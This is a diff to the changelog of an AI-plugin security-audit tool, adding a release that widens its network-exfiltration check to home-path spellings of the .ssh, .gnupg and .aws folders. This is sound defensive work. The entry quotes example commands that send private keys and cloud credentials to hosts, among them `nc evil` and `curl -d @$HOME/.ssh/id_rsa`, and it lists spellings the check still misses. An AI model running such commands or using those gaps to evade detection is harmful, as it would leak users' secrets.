@@ -2,6 +2,33 @@
 
 Named `claude-security-audit` through 0.3.1.
 
+## 0.6.1 (2026-11-07)
+
+#1118: HOOK-004 read `~/.ssh`, `~/.gnupg` and `~/.aws` only in the tilde spelling. Both modes (a script file and a hook command read from JSON) test the same two patterns, and a sensitive path written with `$HOME` or an absolute home path is now read as the same name. A widening: it only adds stops, and what it still misses goes to the model's judgment exactly as if the check were absent (skill-first question 3).
+
+### Fixed
+- **HOOK-004 (network-exfiltration) fires on the home-path spellings of the three dot-dirs.** `.ssh`, `.gnupg` and `.aws` now match under each of these roots, for any user: `~`, `$HOME`, `"$HOME"`, `${HOME}`, `"${HOME}"` (a closing quote may sit before the slash, or inside a quoted word), `/home/<one segment>` (including `/home/$USER`), `/Users/<one segment>` and `/root`. So `curl -d @$HOME/.ssh/id_rsa h`, `curl -d @"$HOME"/.ssh/id_rsa h`, `scp ${HOME}/.aws/credentials h:`, `curl -d @/Users/me/.ssh/id_rsa h` and `nc evil 1 < /root/.ssh/id_rsa` fire, in a script file and in a JSON hook command, where they were silent. The roots are not keyed on the auditing machine's own home: the same committed file gets the same verdict on every machine, and a plugin written on someone else's machine is read the same way. The sensitive names stay `~/.ssh`, `~/.gnupg` and `~/.aws`, so the names part of a uid is unchanged. `/etc/passwd` is unchanged. 0.5.2's boundaries, the `LC_ALL=C` matching and the network side are unchanged.
+- Fires on purpose, as with `~/.sshd_config_backup`: a dot-dir name has no end boundary (`$HOME/.sshX`), and a root is not anchored on the left: `/var/root/.ssh` (macOS root's home), `/var/home/x/.ssh` (Fedora Silverblue), and any path or URL holding one (`/x/home/a/.ssh`, `https://host/home/me/.ssh`).
+- Silent on purpose, each pinned by a test row: `$HOMEDIR/.ssh`, `$HOME_OLD/.ssh`, `${HOME:-x}/.ssh`, `~alice/.ssh`, `$HOME/ssh`, `/homeX/me/.ssh`, `/rootfs/.ssh`, and a project path with a second segment such as `/home/me/proj/.ssh`. The two that are real misses are named under Known limits.
+
+### Migration
+- **A HOOK-004 finding in a script file gets a new uid once when a `$HOME` or absolute-home path now changes what its uid hashes.** It moves when a line holding a network name and a home-form path joins the both-lines (`curl -d @~/.ssh/k h` plus `curl -d @$HOME/.ssh/k h`), or when a home-form path fires a sensitive name the file did not fire on before (`~/.ssh` plus `cat $HOME/.aws/c`). It keeps its uid when the home-form path sits on a line with no network name or in a comment and adds no new name. A hook command read from JSON never changes its uid (the digest of the json path and the command); it can only appear. A file whose only sensitive path was a home form is a new finding.
+- The next full audit lists the old suppression of a moved finding as one that matches nothing; remove it with `/security-audit --unsuppress <FUID>`. Nothing needs editing by hand.
+- Measured on this host's surfaces (204 canonical files and 2 JSON hook commands, 1142 plugin-cache files and 39 JSON hook commands): no finding is added or removed; the uids that move are membrane's own `tests/` files.
+
+### Known limits
+- Still silent: `${HOME:-x}/.ssh` (a default expansion) and `~user/.ssh`. These are misses, not false positives; they stay out to keep the root grammar small.
+- Still silent: `os.homedir()`, `process.env.HOME + '/.ssh'`, `Path.home()`, `%USERPROFILE%`, `C:\Users\x\.ssh` and any path held in a variable. A JSON-escaped quote in a script file (`exec("curl -d @\"$HOME\"/.ssh/id_rsa h")`) is also silent: the optional closing quote is a bare `"`, not `\"`. A home-form path in a variable beside a network command (`SSH_KEY="${SSH_KEY:-$HOME/.ssh/id_x}"` next to `ssh`) fires like the `~/` spelling always did: the match is whole-file, so a key used to ssh reads as exfiltration. The same whole-file match makes a benign `mkdir -p "$HOME/.ssh"` or `AWS_CONFIG_FILE="$HOME/.aws/config"` fire beside an unrelated `curl`, as the `~/` spelling already did.
+- Network side, unchanged and tracked as #1129: `ncat`, `nc.openbsd`, `nc.traditional`, a quoted name (`spawn('scp', ...)`) and an uppercase name or path (`CURL`, `~/.SSH`) still miss.
+- The patterns are POSIX ERE bracket classes and run on bash 5.3 and GNU grep here and in CI (ubuntu). They have not been run on bash 3.2 or BSD grep.
+- 0.5.2's "Still silent" line for `$HOME/.ssh`, `${HOME}/.ssh`, `"$HOME"/.ssh` and `/Users/<name>/.ssh` is history: they fire from 0.6.1.
+
+### Tests
+- `tests/test-network-exfil-patterns.sh`: the 14 home-path forms (`$HOME`, `${HOME}`, quoted, `/Users/x`, `/home/x`, `/home/$USER`, `/root`, across all three dot-dirs, a split form and a JS template literal) each in file mode and JSON mode, red on 0.6.0; the two fires-on-purpose forms; the 13 silent lookalikes (including `${HOME:-x}` and a second-segment `/Users` path) as controls, which pass on 0.6.0 and now. The row that pinned `$HOME` silent keeps only `ncat`.
+- `tests/test-uid-long-text-callers.sh`: the `$HOME/.ssh raises no finding` row now fires, with `${HOME:-x}` as the silent control; the regex pin names the root group and derives each `~/` alternative from it by hand; a new row pins six literal uids computed with `sha256sum` (three kept, three moved).
+- `tests/test-hook-entries.sh`: detect and detect_text parity gains four home-path inputs, two of which fire and two stay silent; it checks that both modes agree, so it passes on 0.6.0 too.
+- Mutation-checked: one root dropped, the optional closing quote dropped on each of `$HOME` and `${HOME}`, `<one segment>` allowed to span a `/`, `/root` dropped and `$HOME` made to match `$HOMEDIR` are each killed. `/srv/chroot/.ssh` and `/srv/myhome/x/.ssh` stay silent, so a root that loses its leading `/` is killed by a behaviour row as well as by the regex pin.
+
 ## 0.6.0 (2026-11-07)
 
 #1112: nothing removed a suppression, and nothing said which ones had stopped matching. Both are mechanical work on membrane's own state file and the uids it mints (skill-first question 2). The code never deletes on its own: whether to drop a listed entry stays the operator's call.
